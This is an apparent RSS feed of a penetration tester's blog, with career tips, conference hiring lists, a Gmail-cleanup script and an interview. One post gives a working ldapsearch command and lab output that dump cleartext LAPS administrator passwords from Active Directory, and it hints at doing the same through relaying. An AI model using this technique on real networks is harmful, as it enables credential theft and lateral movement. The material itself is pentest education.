<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>https://malicious.link/</link>
    <description>Recent content on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 22 Jul 2018 11:30:44 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Getting Hired: A Few Tips</title>
      <link>https://malicious.link/post/2018/getting-hired-a-few-tips/</link>
      <pubDate>Sun, 22 Jul 2018 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/getting-hired-a-few-tips/</guid>
      <description>&lt;p&gt;In early August of 2017 &lt;a href=&#34;https://twitter.com/mubix/status/892760622563241988&#34;&gt;I posted a few tips to Twitter regarding interviewing and getting hired in general&lt;/a&gt;. I&amp;rsquo; pasting them here to preserve them. I only had 140 characters to make these, and I think there is a lot more you can do, but 30 tips is a good start.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Don&amp;rsquo;t post obvious CFAA violations to social media&lt;/li&gt;
&lt;li&gt;If you go in without a job and a chip on your shoulder, you&amp;rsquo;ll leave the same way&lt;/li&gt;
&lt;li&gt;If you don&amp;rsquo;t ask follow up questions, I won&amp;rsquo;t have any either, like &amp;ldquo;would you like the job?&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Exaggerating on your resume isn&amp;rsquo;t a good idea, but if you do, be ready to explain it&lt;/li&gt;
&lt;li&gt;The company is going to look at your social media. Privacy concerns? Don&amp;rsquo;t post publicly. Don&amp;rsquo;t get sassy in the interview about it.&lt;/li&gt;
&lt;li&gt;Dropping a vuln in the company during the interview is a stupid move. (Personal experience)&lt;/li&gt;
&lt;li&gt;Your attire matters. If you look like you just got out of bed, I&amp;rsquo;ll probably just let you go back to it.&lt;/li&gt;
&lt;li&gt;Being honest about not knowing something is great. Emailing after the interview that you researched it and now understand it is AWESOME!&lt;/li&gt;
&lt;li&gt;It is always ok to ask why you didn&amp;rsquo;t get the job and where you can improve. Unfortunately straight answers aren&amp;rsquo;t always possible.&lt;/li&gt;
&lt;li&gt;Like college, trying many types of Infosec jobs will make you better at all of them.&lt;/li&gt;
&lt;li&gt;Stay humble.&lt;/li&gt;
&lt;li&gt;If you were referred by a friend that works there already, respect the fact that you are representing them as well.&lt;/li&gt;
&lt;li&gt;Making money is better than not. If you think you are too good to be a Walmart greeter, you are probably too good for this job too.&lt;/li&gt;
&lt;li&gt;Try not to make it personally if you don&amp;rsquo;t get the job today. You might be able to apply later. You won&amp;rsquo;t if you lash out.&lt;/li&gt;
&lt;li&gt;Contributions to open source projects isn&amp;rsquo;t required, but is a good way to demonstrate values, skills, and mindset.&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t whine and complain during an interview. It&amp;rsquo;s ok to point out deficiencies, or answer why you left your last job but keep it brief.&lt;/li&gt;
&lt;li&gt;Set expectations and ask questions like: Can I ping you if I haven&amp;rsquo;t heard from you in a week? What should I wear to the interview&lt;/li&gt;
&lt;li&gt;Minimal self deprecation is fine, but if you spend the whole interview talking about how much you suck, I&amp;rsquo;ll believe it.&lt;/li&gt;
&lt;li&gt;Include &amp;ldquo;Selected Accomplishments&amp;rdquo; part in your resume. 2-4 things that you are particularly proud of, doesn&amp;rsquo;t have to be done at work.&lt;/li&gt;
&lt;li&gt;The question &amp;ldquo;where do you want to be / doing 2/4/10 years&amp;rdquo; is a standard question. &amp;ldquo;I don&amp;rsquo;t know&amp;rdquo; is ok, but a prepared answer is better.&lt;/li&gt;
&lt;li&gt;Sarcasm is taken differently by everyone. Might go over good or bad. If it&amp;rsquo;s how you deal w/ nervousness, practice interviewing more.&lt;/li&gt;
&lt;li&gt;Practice interviewing. Find someone that will give you candid feedback and interview for positions you want with them.&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t take an interview call in a crowded or loud place. Rescheduling is totally ok as long as it&amp;rsquo;s done with more than 24 hours notice.&lt;/li&gt;
&lt;li&gt;The saying &amp;ldquo;It&amp;rsquo;s not what, but who you know&amp;rdquo; is unfortunately true a lot of times. It&amp;rsquo;s because &lt;em&gt;who&lt;/em&gt; you know can vouch for &lt;em&gt;what&lt;/em&gt; you know.&lt;/li&gt;
&lt;li&gt;Just because someone is a manager doesn&amp;rsquo;t mean they can&amp;rsquo;t run circles around you technically and are just acting dumb. (Personal experience)&lt;/li&gt;
&lt;li&gt;If your LinkedIn profile does not match up with your resume, you will probably be asked about it. (i.e. degree, certs, jobs mismatch)&lt;/li&gt;
&lt;li&gt;Ask about travel and feel free to ask to talk to potential co-workers about travel and other topics to get the ground truth.&lt;/li&gt;
&lt;li&gt;Offer letters and nearly all hiring / new-hire documents are contracts. You can &amp;ldquo;X&amp;rdquo; out anything you don&amp;rsquo;t agree with. $employr will ahve to approve the change.&lt;/li&gt;
&lt;li&gt;When asked to list 1 or more strengths or weaknesses: Strengths: stay humble Weaknesses: share how you are working to get better&lt;/li&gt;
&lt;li&gt;Everything on the Internet is suspect. Trust but verify right? Learn things for yourself. Blog, tweet, share how/what you learned. YMMV.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Have some yourself? I would love to add it! Please just tweet a reply via Twitter to me and I&amp;rsquo;ll get it added. Thanks!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>A Few Changes</title>
      <link>https://malicious.link/post/2018/a-few-changes/</link>
      <pubDate>Mon, 09 Jul 2018 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/a-few-changes/</guid>
      <description>&lt;p&gt;For nearly a year I left a CoinHive miner up on the blog so that people that didn&amp;rsquo;t feel like or couldn&amp;rsquo;t afford a way to support the blog could do so via a bit of CPU power. Unfortunately during that time lots of malware started to use services like coinhive and I quickly started recieving warning that my site had been &amp;ldquo;hacked&amp;rdquo; or was showing up as malicious (har har). Well, finally got off my butt and removed it. Sorry to my readers who had to deal with it.&lt;/p&gt;

&lt;p&gt;More later! Lots of fun stuff to come.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 ShmooCon Hiring List</title>
      <link>https://malicious.link/post/2017/2018-shmoocon-hiring-list/</link>
      <pubDate>Thu, 28 Dec 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2018-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;&lt;center&gt;&lt;iframe width=&#34;405&#34; height=&#34;208&#34; src=&#34;https://w2.countingdownto.com/2049915&#34; frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;http://shmoocon.org/&#34;&gt;ShmooCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/aDRYaH5wubSqWcUk1&#34;&gt;https://goo.gl/forms/aDRYaH5wubSqWcUk1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/&#34;&gt;https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vQotxxtoByz-ZvGipDrgRc2DqSkjlcJjMLaHvqY1vYQMY0r7pWMQCteniEE9ef-cyHEWugdTYbbu8Y5/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Open Source Pentesting</title>
      <link>https://malicious.link/post/2017/open-source-pentesting/</link>
      <pubDate>Fri, 27 Oct 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/open-source-pentesting/</guid>
      <description>&lt;p&gt;My talk today at &lt;a href=&#34;http://wildwesthackinfest.com/&#34;&gt;Wild West Hacking Fest&lt;/a&gt; was about some documents that I released here. I&amp;rsquo;ll make this blog post more indepth later but for right now I wanted to get the slides out.&lt;/p&gt;

&lt;p&gt;(If you can&amp;rsquo;t access one of the documents yet, don&amp;rsquo;t ask for permission to do so, it just means either they aren&amp;rsquo;t ready yet, I&amp;rsquo;ll make posts about each one as they become available)&lt;/p&gt;

&lt;p&gt;Here is the main slide deck for the docs: &lt;a href=&#34;https://bit.ly/OpenSourcePentest&#34;&gt;https://bit.ly/OpenSourcePentest&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here are the slides for the release talk (not the same as the link above):&lt;/p&gt;

&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vRuow-CSzZ7VCmUePL2uPKJUZ7fbGskHpFjKgWwpARTGr9crbgJnWCamA6Yg20K02uWDpQotGOXucPg/embed?start=true&amp;loop=true&amp;delayms=3000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>2017 GrrCon Hiring List</title>
      <link>https://malicious.link/post/2017/2017-grrcon-hiring-list/</link>
      <pubDate>Mon, 16 Oct 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2017-grrcon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2017 UNOFFICIAL &lt;a href=&#34;http://grrcon.com/&#34;&gt;GrrCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/ddfN6gHPbCJweGUw2&#34;&gt;https://goo.gl/forms/ddfN6gHPbCJweGUw2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/18YEyfp3ctrCz3WgaCArKp0wLn0xWEfV99X-UDmhy4D0/&#34;&gt;https://docs.google.com/spreadsheets/d/18YEyfp3ctrCz3WgaCArKp0wLn0xWEfV99X-UDmhy4D0/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vQHwcCjBeNMpW-KsLC1ghVBMO5xGor03XfOMCQUo7IC7P-E3o8K69RnErKLtqy9l6K_hIG2Sqbssc_I/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Automatically deleting old Gmail email</title>
      <link>https://malicious.link/post/2017/automatically-deleting-old-gmail-mail/</link>
      <pubDate>Thu, 12 Oct 2017 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/automatically-deleting-old-gmail-mail/</guid>
      <description>&lt;p&gt;Like many of you I&amp;rsquo;m a gmail hoarder. I never deleting anything, just &amp;ldquo;archive&amp;rdquo; everything. I &amp;ldquo;might&amp;rdquo; need it later, or &amp;ldquo;I&amp;rsquo;ll get to it when I have time&amp;rdquo;. If we get really honest with ourselves, we never will actually get to it, and because we have this buffer, this procrastination opportunity, we grab it. We use words like &amp;ldquo;but I may need proof of X&amp;rdquo;, or &amp;ldquo;I could need to reference this&amp;rdquo;, or &amp;ldquo;I don&amp;rsquo;t really want to put this person in my contacts so I&amp;rsquo;ll just save the email&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Personally I have made a choice to force myself to be more engaged in my email going forward. I have set a Google Script to run through all of my email every day and if it is older than 90 days, and doesn&amp;rsquo;t have the specail label &amp;ldquo;keep&amp;rdquo; on it, it&amp;rsquo;s gone. I obviously didn&amp;rsquo;t care enough about whatever was going on in that email to take the time to respond to it.&lt;/p&gt;

&lt;p&gt;Whatever your reason for finding this post, here is how I got it done:&lt;/p&gt;

&lt;p&gt;At first I started with just searching for a way to make a simple filter to do this. There are plenty of blog posts that show you this is possible, but it turns out that at some point Gmail switched to only applying filters to incoming messages (makes sense, lots less overhead, no need to load EVERYONEs email every hour). This makes deleting messages older than X impossible with simple filters however. I did however learn of a search query term you can use to find messages/threads older than X. Imaginatively called &lt;code&gt;older_than:&lt;/code&gt;. So a search in Gmail for &lt;code&gt;older_than:90d&lt;/code&gt; resulted in exactly the emails I wanted to find.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s when I started looking into Google Scripting. The language is pretty easy and straight forward if you have ever programmed in anything like Javascript or C++.&lt;/p&gt;

&lt;p&gt;Using the API reference here: &lt;a href=&#34;https://developers.google.com/apps-script/reference/gmail/&#34;&gt;https://developers.google.com/apps-script/reference/gmail/&lt;/a&gt; I was able to cobble together the following in about 20 minutes:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function DeleteOldEmail () {
	var threads;
	var thread;

	threads = GmailApp.search(&amp;quot;older_than:90d&amp;quot;);
	for(var i = 0; i &amp;lt; threads.length; i++)
	{
		var thread = threads[i];
		GmailApp.moveThreadToTrash(thread);
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, that script leaves a lot to be desired. It doesn&amp;rsquo;t have any case where a label like &amp;ldquo;save&amp;rdquo; or &amp;ldquo;keep&amp;rdquo; might come into play, it just hauls off and deletes everything old. But before we start improving lets show you how it looks when you&amp;rsquo;re actually doing it (I&amp;rsquo;ll comment out the &amp;ldquo;moveThreadToTrash in the screenshots)&lt;/p&gt;

&lt;p&gt;Go to &lt;a href=&#34;https://script.google.com/&#34;&gt;https://script.google.com/&lt;/a&gt; and you&amp;rsquo;ll be presented with a new project if you haven&amp;rsquo;t been here before:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then, copy and past the code in and save it. It&amp;rsquo;ll ask you to name the project. I just named it DeleteOldEmail. Feel free to name it anything you wish. It is what is going to show up in your Google Security &amp;ldquo;Approve Apps&amp;rdquo; list.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The first time I ran this I commented out the lines for deleting and added in a &amp;ldquo;Logger&amp;rdquo; line just so I knew what would be deleted:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function DeleteOldEmail () {
	var threads;
	var thread;

	threads = GmailApp.search(&amp;quot;older_than:90d&amp;quot;);
	for(var i = 0; i &amp;lt; threads.length; i++)
	{
      var thread = threads[i];
      Logger.log(thread.getFirstMessageSubject())
		//GmailApp.moveThreadToTrash(thread);
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then run it, the first time you run it, it will ask for permissions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you try this out and decide you don&amp;rsquo;t like it you can revoke the permissions here: &lt;a href=&#34;https://myaccount.google.com/permissions&#34;&gt;https://myaccount.google.com/permissions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you went with the logging you&amp;rsquo;ll see something like this if you go to &lt;strong&gt;View-&amp;gt;Logs&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Last step is to set this up so it automatically runs, I mean that&amp;rsquo;s the whole point. For that, we go to &lt;strong&gt;Edit-&amp;gt;Current Project&amp;rsquo;s Triggers&lt;/strong&gt;. And we are greeted with the following (once we click to add a new trigger):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I chose to set up mine to run every 12 hours, but you can set it to run once a day, once a week, whatever.&lt;/p&gt;

&lt;p&gt;Again, this script leaves a lot to be desired, You can totally mess with the query search string any way you wish. I&amp;rsquo;ve created a Github repository that I&amp;rsquo;ll put improvements on the script: &lt;a href=&#34;https://github.com/mubix/GScriptOldEmal&#34;&gt;https://github.com/mubix/GScriptOldEmal&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Have fun with it. The two improvments I&amp;rsquo;ll be adding are the label exclusion for &amp;ldquo;keep&amp;rdquo; and notifications (a list of email subjects deleted)&lt;/p&gt;

&lt;p&gt;Thanks for your time.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2017 DerbyCon Hiring List</title>
      <link>https://malicious.link/post/2017/2017-derbycon-hiring-list/</link>
      <pubDate>Sun, 13 Aug 2017 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2017-derbycon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2017 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/vyqVHjZkxE4WhA9X2&#34;&gt;https://goo.gl/forms/vyqVHjZkxE4WhA9X2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/&#34;&gt;https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Dump LAPS passwords with ldapsearch</title>
      <link>https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/</link>
      <pubDate>Mon, 24 Jul 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/ldapsearch_laps_rights.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).&lt;/p&gt;

&lt;p&gt;LAPS stores it&amp;rsquo;s information in Active Directory:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The expiration time: &lt;code&gt;ms-Mcs-AdmPwdExpirationTime: 131461867015760024&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;And the actual password in clear text: &lt;code&gt;ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the &lt;code&gt;All extended rights&lt;/code&gt; permission to the object or Full Control of it.&lt;/p&gt;

&lt;p&gt;In many organizations, there are pockets of &lt;strong&gt;OU&lt;/strong&gt; admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over.&lt;/p&gt;

&lt;p&gt;There is already a Metasploit module thanks to &lt;a href=&#34;https://github.com/Meatballs1&#34;&gt;Meatballs&lt;/a&gt;:
&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&lt;/a&gt;. But, unfortunately I don&amp;rsquo;t always have access to a Meterpreter session to run the module.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;ldapsearch&lt;/code&gt; (which is included in the package &lt;code&gt;ldapscripts&lt;/code&gt; on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ldapsearch -x -h 192.168.80.10 -D \
&amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; \
&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets break this down:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; - Use basic authentication&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-h 192.168.80.10&lt;/code&gt; - Connect to the Domain Controller for ldap&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-D &amp;quot;helpdesk&amp;quot; -w ASDqwe123&lt;/code&gt; - Login as the &lt;code&gt;helpdesk&lt;/code&gt; user, with the password &lt;code&gt;ASDqwe123&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-b &amp;quot;dc=sittingduck,dc=info&amp;quot;&lt;/code&gt; - This loads the base LDAP object of the entire domain.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot;&lt;/code&gt; - Filter out any objects that I can&amp;rsquo;t see a value for &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; for. (If you have rights as that user to see even one Administrator password, this will show it.)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; - Only show me the &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; object (which by default includes the object name and DN so you will still know what host it belongs to)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What does that look like?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ldapsearch -x -h 192.168.80.10 -D &amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; &amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=sittingduck,dc=info&amp;gt; with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd
#

# DC1, Domain Controllers, sittingduck.info
dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&amp;amp;,F

# SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR

# SD_WSUS_2012, LabComputers, Lab, sittingduck.info
dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T

# WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(

# search reference
ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info

# search reference
ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info

# search result
search: 2
result: 0 Success
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, just having the local admin password doesn&amp;rsquo;t ensure that it&amp;rsquo;s enabled, but there is a good bet that you are good to go now.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.S.&lt;/strong&gt; You can also authenticate using Kerberos (think Golden/Silver tickets)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.P.S&lt;/strong&gt; Because Windows doesn&amp;rsquo;t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py&#34;&gt;ntlmrelayx&lt;/a&gt; to dump LAPS passwords ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Security Affairs Questions</title>
      <link>https://malicious.link/post/2017/security-affairs-questions/</link>
      <pubDate>Mon, 03 Jul 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/security-affairs-questions/</guid>
      <description>

&lt;p&gt;Soon after I blogged about the &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;&amp;ldquo;Snagging Creds from Locked Machines&amp;rdquo;&lt;/a&gt; and it went a bit viral for a day, &lt;a href=&#34;https://twitter.com/securityaffairs&#34;&gt;Pierluigi Paganini&lt;/a&gt; from &lt;a href=&#34;http://securityaffairs.co/wordpress/&#34;&gt;SecurityAffairs.co&lt;/a&gt; asked me some great questions, that I failed to answer in a timely manner. They are probably a lot less useful to him now (8 months late), but I thought I would answer them anyways.&lt;/p&gt;

&lt;h3 id=&#34;you-are-one-of-the-most-respected-experts-on-cyber-security-could-you-tell-me-what-your-technical-background-is-and-when-you-started-hacking&#34;&gt;You are one of the most respected experts on cyber security. Could you tell me what your technical background is and when you started hacking?&lt;/h3&gt;

&lt;p&gt;I think my earliest &amp;ldquo;hacking&amp;rdquo; was cheating at video games. I enjoyed learning the mechanics of how the &lt;a href=&#34;https://en.wikipedia.org/wiki/Game_Genie&#34;&gt;Game Genie&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/GameShark&#34;&gt;GameShark&lt;/a&gt; worked, and how I could cheat at games much more than playing them. My parents always thought that I ruined the games, but it really was the figuring out how to get the right hex for infinite life or ammo that was the game for me.&lt;/p&gt;

&lt;p&gt;After that I owe my traditional IT / Security learning to the Marine Corps 0651 and 0656 schools, the amazingly patient Marines and civilians at the MARCERT, the &lt;a href=&#34;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;OSCP&lt;/a&gt; and &lt;a href=&#34;http://carnal0wnage.attackresearch.com/&#34;&gt;Chris Gates&amp;rsquo; blog&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;what-was-your-greatest-hacking-challenge&#34;&gt;What was your greatest hacking challenge?&lt;/h3&gt;

&lt;p&gt;My &amp;ldquo;greatest hacking challenge&amp;rdquo; I would say is myself. Self awareness is an ever progressing goal, I attempt to figure out and make myself better every day. I fail at it a lot, but all the best hacks are pure and simple perseverance and I plan to never let this one have the better of me.&lt;/p&gt;

&lt;h3 id=&#34;what-are-the-4-tools-that-cannot-be-missed-in-the-hacker-s-arsenal-and-why&#34;&gt;What are the 4 tools that cannot be missed in the hacker&amp;rsquo;s arsenal and why?&lt;/h3&gt;

&lt;p&gt;So much troll ammo in that question. Or I could go the philosophical route and talk about the mind, and never giving up, but I&amp;rsquo;ll take the question at face value:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;A programming language. Yes, you don&amp;rsquo;t have to know programming to be in &amp;ldquo;Information Security&amp;rdquo; but to be a &amp;ldquo;hacker&amp;rdquo; (in the sense of breaking into systems), knowing &lt;strong&gt;&lt;em&gt;a&lt;/em&gt;&lt;/strong&gt; language will save you when the tool that you need for a very specific use case just doesn&amp;rsquo;t exist. It also helps you when you run into a tool that is broken, that everyone seems to use, but for some reason you are the only one noticing it&amp;rsquo;s broken.&lt;/li&gt;
&lt;li&gt;An Intel NUC (or other computer) with ESXi (or other virtualization) on it. Having a lab, even on a hand-me-down laptop/computer with Virtualbox and trial copies of Windows, I was able to learn more by building whatever application I was trying break into, than I ever would have by poking at it from the Internet.&lt;/li&gt;
&lt;li&gt;A blog. I forget things all the time and I usually use my blog or another note taking method (pen and paper, text editor, telling friends about it), to be able to reference it later when I need it. Even if you are the only reader of your own blog it is hands down one of the best method of learning for me because it forces me to re-do things and revisit my assumptions.&lt;/li&gt;
&lt;li&gt;Metasploit. Mostly because it makes things dead simple, and learning to use it isn&amp;rsquo;t very hard.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;which-are-the-most-interesting-hacking-communities-on-the-web-today&#34;&gt;Which are the most interesting hacking communities on the web today?&lt;/h3&gt;

&lt;p&gt;I&amp;rsquo;ve never really been welcome or even interested in the darker side of hacking communities. I would get caught if I even tried to dive into that world.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;To know one&amp;rsquo;s limitations is to know one&amp;rsquo;s self&lt;/p&gt;
&lt;/blockquote&gt;

